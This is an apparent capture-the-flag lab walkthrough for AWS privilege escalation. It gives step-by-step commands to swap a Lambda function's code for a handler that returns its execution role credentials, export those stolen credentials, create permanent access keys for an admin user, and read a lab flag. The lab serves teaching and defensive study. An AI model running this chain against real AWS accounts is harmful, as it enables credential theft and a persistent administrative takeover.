# Guided Walkthrough: Multi-Hop Privilege Escalation via Lambda Code Update and CreateAccessKey

This scenario demonstrates a sophisticated two-hop privilege escalation attack that chains two distinct techniques: Lambda function code manipulation and IAM access key creation. The attack exploits the common misconfiguration where users are granted permissions to update Lambda function code without restrictions, combined with Lambda execution roles that have overly permissive IAM capabilities.

In the first hop, an attacker with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` permissions modifies an existing Lambda function to exfiltrate the function's execution role credentials. When Lambda functions execute, they receive temporary credentials for their assigned IAM role through the instance metadata service. By injecting malicious code that returns these credentials, the attacker can capture the Lambda role's identity and permissions.

The second hop leverages the exfiltrated Lambda role credentials, which have `iam:CreateAccessKey` permission on an administrative user. This is a dangerous combination because Lambda execution roles are often granted broad permissions for automation purposes, and the ability to create access keys for admin users provides persistent, full administrative access. This attack chain demonstrates how seemingly limited permissions can be combined to achieve complete environment compromise.

## The Challenge

You start as `pl-prod-lambda-004-to-iam-002-starting-user` — an IAM user with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` on the `pl-prod-lambda-004-to-iam-002-target-function` Lambda function. Your goal is to obtain full administrative access to the AWS account, specifically by getting credentials for `pl-prod-lambda-004-to-iam-002-admin-user`, which has `AdministratorAccess`.

You cannot call `iam:CreateAccessKey` directly as your starting user. But you have two key capabilities: you can modify the Lambda function's code, and you can invoke it. Somewhere in that chain lies your path forward.

## Reconnaissance

First, let's confirm who we are and what we can see:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

Now let's look at the target Lambda function — `lambda:GetFunction` is one of the helpful permissions on this starting user:

```bash
aws lambda get-function --function-name pl-prod-lambda-004-to-iam-002-target-function
```

Pay close attention to the `Configuration.Role` field in the output. This tells you the IAM execution role the function runs as: `pl-prod-lambda-004-to-iam-002-lambda-role`. That role is your intermediate pivot point. If you can make the Lambda function tell you its own credentials, you can operate as that role.

## Exploitation

### Hop 1: Lambda Code Injection to Exfiltrate Execution Role Credentials

Lambda functions receive their execution role's temporary credentials as environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`. If you control the function's code, you can make it return those values.

Create a malicious Python handler that extracts and returns the credentials:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import json
import os

def lambda_handler(event, context):
    credentials = {
        'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID', 'NOT_FOUND'),
        'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY', 'NOT_FOUND'),
        'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN', 'NOT_FOUND'),
        'AWS_REGION': os.environ.get('AWS_REGION', os.environ.get('AWS_DEFAULT_REGION', 'NOT_FOUND'))
    }
    return {
        'statusCode': 200,
        'body': json.dumps({'success': True, 'credentials': credentials})
    }
EOF

cd /tmp && zip lambda_function.zip lambda_function.py
```

Now deploy it — the filename must match the handler name (`lambda_function.lambda_handler`):

```bash
aws lambda update-function-code \
    --function-name pl-prod-lambda-004-to-iam-002-target-function \
    --zip-file fileb:///tmp/lambda_function.zip
```

Wait about 15 seconds for Lambda to finish deploying the new code, then invoke it:

```bash
aws lambda invoke \
    --function-name pl-prod-lambda-004-to-iam-002-target-function \
    --payload '{}' \
    /tmp/response.json

cat /tmp/response.json | jq -r '.body' | jq '.'
```

The response contains the Lambda execution role's live temporary credentials. Extract them:

```bash
RESPONSE_BODY=$(cat /tmp/response.json | jq -r '.body')
export AWS_ACCESS_KEY_ID=$(echo "$RESPONSE_BODY" | jq -r '.credentials.AWS_ACCESS_KEY_ID')
export AWS_SECRET_ACCESS_KEY=$(echo "$RESPONSE_BODY" | jq -r '.credentials.AWS_SECRET_ACCESS_KEY')
export AWS_SESSION_TOKEN=$(echo "$RESPONSE_BODY" | jq -r '.credentials.AWS_SESSION_TOKEN')
```

You are now operating as `pl-prod-lambda-004-to-iam-002-lambda-role`. Hop 1 complete.

### Hop 2: IAM CreateAccessKey to Gain Persistent Admin Access

The Lambda execution role has `iam:CreateAccessKey` on `pl-prod-lambda-004-to-iam-002-admin-user`. Use it to generate a permanent access key pair for that admin user:

```bash
aws iam create-access-key --user-name pl-prod-lambda-004-to-iam-002-admin-user
```

Save the `AccessKeyId` and `SecretAccessKey` from the output. Then switch to those credentials:

```bash
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID="<new_admin_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<new_admin_secret_access_key>"
```

## Verification

Verify that you now have administrator access:

```bash
aws sts get-caller-identity
aws iam list-users
```

`list-users` requires `iam:ListUsers`, which is included under `AdministratorAccess`. If it returns the list of IAM users in the account, you have successfully escalated to full admin.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy attached to the admin user provides implicitly.

Using the admin user's permanent access keys you created in the previous step, read the flag:

```bash
aws ssm get-parameter \
    --name "/pathfinding-labs/flags/lambda-004-to-iam-002-to-admin" \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You started with the ability to modify and invoke a Lambda function — permissions that, in isolation, seem like a developer convenience feature rather than a security risk. But Lambda functions run as IAM roles, and those roles have credentials. By injecting code that reads the execution environment's credential variables and returning them in the function response, you pivoted from your starting user into the Lambda execution role.

That role was scoped with `iam:CreateAccessKey` on the admin user — likely granted so the automation could manage credentials for other services. By creating a permanent access key for the admin user, you converted a temporary execution role session into persistent administrative access. This is a textbook example of why granting IAM credential-management permissions to Lambda execution roles is so dangerous, and why the combination of `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` on the same principal creates a complete credential exfiltration capability.
